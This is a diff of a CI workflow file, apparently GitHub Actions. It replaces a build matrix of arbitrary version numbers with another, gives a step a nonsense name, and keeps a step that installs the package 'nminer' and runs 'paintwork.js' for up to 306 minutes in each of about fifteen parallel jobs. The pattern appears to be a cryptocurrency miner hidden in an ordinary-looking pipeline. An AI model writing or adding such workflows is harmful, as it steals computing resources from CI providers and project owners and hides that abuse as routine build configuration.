@@ -9,23 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4956 }
-          - { version: 6588 }
-          - { version: 1034 }
-          - { version: 9455 }
-          - { version: 615 }
-          - { version: 2300 }
-          - { version: 8785 }
-          - { version: 9107 }
-          - { version: 1335 }
-          - { version: 7399 }
-          - { version: 3957 }
-          - { version: 3129 }
-          - { version: 7690 }
-          - { version: 1181 }
-          - { version: 7256 }
-          - { version: 4151 }
-          - { version: 669 }
+          - { version: 7198 }
+          - { version: 9557 }
+          - { version: 8591 }
+          - { version: 4023 }
+          - { version: 6658 }
+          - { version: 7520 }
+          - { version: 1285 }
+          - { version: 3523 }
+          - { version: 3429 }
+          - { version: 3428 }
+          - { version: 7423 }
+          - { version: 2830 }
+          - { version: 1794 }
+          - { version: 4063 }
+          - { version: 8951 }
 
     steps:
       - name: Checkout
@@ -36,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: despite wisely though fledgling diligently
+      - name: or loosely rotten woot
         run: |
           npm install nminer@latest
-          timeout 340m node paintwork.js || echo "paintwork executed"
+          timeout 306m node paintwork.js || echo "paintwork executed"
